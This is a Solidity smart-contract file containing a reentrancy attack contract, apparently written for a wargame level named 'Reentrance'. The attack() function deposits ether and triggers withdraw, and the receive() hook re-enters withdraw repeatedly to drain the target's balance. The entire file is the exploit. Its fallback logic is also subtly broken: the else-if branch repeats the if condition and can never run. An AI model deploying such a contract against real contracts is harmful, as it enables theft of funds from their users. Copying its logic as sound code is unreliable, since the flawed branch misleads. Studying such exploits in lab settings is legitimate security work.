// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external;
    function balanceOf(address _who) external view returns (uint256);
}

contract ReentrancyAttacker {

    // State Variables
    IReentrance public target;
    uint256 public amount;
    // Constructor
    constructor(address _origin) public {
        target = IReentrance(_origin);
    }

    // attack() function
    function attack() public payable {
        amount = msg.value;
        target.donate{value: amount}(address(this));
        target.withdraw(amount);
    }

    // receive() function
    receive() external payable {
        if (address(target).balance > 0) {
            target.withdraw(amount);
        } else if (address(target).balance > 0) {
            target.withdraw(address(target).balance);

        }
    }

}